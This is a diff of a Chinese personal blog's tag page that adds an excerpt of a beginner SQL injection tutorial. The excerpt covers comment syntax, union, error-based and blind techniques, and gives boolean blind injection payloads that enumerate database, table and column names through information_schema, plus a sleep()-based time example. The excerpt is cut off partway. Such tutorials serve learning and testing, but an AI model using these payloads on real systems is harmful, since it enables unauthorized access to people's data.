@@ -3,7 +3,7 @@
   <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>渗透 | xiaoguai</title>
-<link rel="shortcut icon" href="https://xiaoguai69.github.io/favicon.ico?v=1652018887575">
+<link rel="shortcut icon" href="https://xiaoguai69.github.io/favicon.ico?v=1652019260819">
 <link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
 <link rel="stylesheet" href="https://xiaoguai69.github.io/styles/main.css">
 <link rel="alternate" type="application/atom+xml" title="渗透 | xiaoguai - Atom Feed" href="https://xiaoguai69.github.io/atom.xml">
@@ -18,7 +18,7 @@
       <div class="main-content">
         <div class="site-header">
   <a href="https://xiaoguai69.github.io">
-  <img class="avatar" src="https://xiaoguai69.github.io/images/avatar.png?v=1652018887575" alt="">
+  <img class="avatar" src="https://xiaoguai69.github.io/images/avatar.png?v=1652019260819" alt="">
   </a>
   <h1 class="site-title">
     xiaoguai
@@ -97,8 +97,85 @@
         
       </div>
       
+        <a href="https://xiaoguai69.github.io/post/渗透基础总结/" class="post-feature-image" style="background-image: url('https://xiaoguai69.github.io/post-images/渗透基础总结.png')">
+        </a>
+      
       <div class="post-abstract">
-        
+        <h1 id="一sql注入">一：<strong>sql注入</strong></h1>
+<h5 id="什么是sql注入">什么是sql注入？？？</h5>
+<p><code>就是指web应用程序在对用户输入的合法性没有进行严格判断或过滤不严格，导致攻击者可以额外添加sql语句，以此欺骗服务器达到执行非授权的任意查询的动作</code></p>
+<h2 id="i数据库基础">Ⅰ：数据库基础</h2>
+<h4 id="sql中的注释">sql中的注释</h4>
+<pre><code class="language-sql">create database  123        --创建数据库123'     --是一个单行注释
+/**/               /*这是创建数据库，这个是一个多行注释*/
+#                  注释后边的
+</code></pre>
+<h4 id="sql中链接字符串的函数">sql中链接字符串的函数</h4>
+<p><a href="https://links.jianshu.com/go?to=https%3A%2F%2Fbaijiahao.baidu.com%2Fs%3Fid%3D1595349117525189591%26wfr%3Dspider%26for%3Dpc">concat(),concat_ws()与及group_concat()的用法</a></p>
+<p><code>concat(str1,str2,…)</code>——没有分隔符地连接字符串</p>
+<p><code>concat_ws(separator,str1,str2,…)</code>——含有分隔符地连接字符串</p>
+<p><code>group_concat(str1,str2,…)</code>——连接一个组的所有字符串，知道这三个函数能一次性查出所有信息就行了。</p>
+<h3 id="1注入简介">①注入简介</h3>
+<ul>
+<li>回显正常---&gt; 联合查询 union select</li>
+<li>回显报错---&gt; Duplicate entry()<br>
+extractvalue()<br>
+　　       updatexml()</li>
+<li>盲注    ---&gt;布尔型盲注<br>
+基于时间的盲注sleep()</li>
+</ul>
+<h4 id="sql注入原理">sql注入原理</h4>
+<p>恶意的查询语句执行，是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，来得到数据库内的信息</p>
+<h4 id="根据sql数据分类">根据sql数据分类</h4>
+<h5 id="1-整形注入">1、整形注入</h5>
+<h5 id="2-字符型注入">2、字符型注入</h5>
+<h4 id="根据sql注入语法分类">根据sql注入语法分类</h4>
+<p>btuse，可以根据这五个字母进行划分</p>
+<h5 id="1-布尔注入boolean-based-blind-sql-injection">1、布尔注入（Boolean-based blind SQL injection）</h5>
+<p>不会返回结果，只能得到是或者否</p>
+<pre><code class="language-sql">#常用函数
+length(str)     #返回str字符串的长度。
+substr(str, pos, len)   #将str从pos位置开始截取len长度的字符进 行返回。注意这里的pos位置是从1开始的，不是数组的0开始
+mid(str,pos,len) #跟上面的一样，截取字符串
+ascii(str)     #返回字符串str的最左面字符的ASCII代码值。
+ord(str)         #同上，返回ascii码
+if(a,b,c)          #a为条件，a为true，返回b，否则返回c，如if(1&gt;2,1,0),返回0
+limit       #返回a+1到a+b行的数据 
+
+#常用语句
+1.首先我们需要判断数据库长度 
+' or Length(database()) = 8 #返回true说明数据库长度为8
+2.获取数据库名字
+' or ord(mid(database(),1,1)) ='ascill值'#
+依次获取
+3.获取表的总数
+' or (select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() )= 2#
+4.获取表的长度(第一个表)
+' or (select length(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1 )= (猜测得长度)#
+5.获取表的内容
+' or  mid((select TABLE_NAME from information_schema.TABLES where 
+TABLE_SCHEMA=database() limit 0,1),1,1)   = 'a' #
+6.获取表的字段的总数
+' or  (select count(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME=表名 ) = 8#8返回true说明有8个表
+依次类推,最后推出内容。因为是盲猜所以只能这样一个一个去推手工比较麻烦 通常使用sqlmap进行注入
+
+</code></pre>
+<h5 id="2-时间注入time-based-blind-sql-injection">2、时间注入（Time-based blind SQL injection）</h5>
+<p>可以根据返回时间长短</p>
+<pre><code class="language-sql">在MYSQL中有一个函数：sleep（duration）,这个函数的意识是在duration参数给定的秒数之后运行语句，如下SQL语句：
+
+select  * from  users where id=1 and sleep(3);    /* 3秒之后执行SQL语句*/
+
+#常用参数
+sleep()/延迟函数
+if(condition,true,false)/若条件为真 返回true，若条件为假 返回false
+substring(&quot;string&quot;,strart,length)
+
+
+常用语句
+
+</code></pre>
+
       </div>
     </article>
   
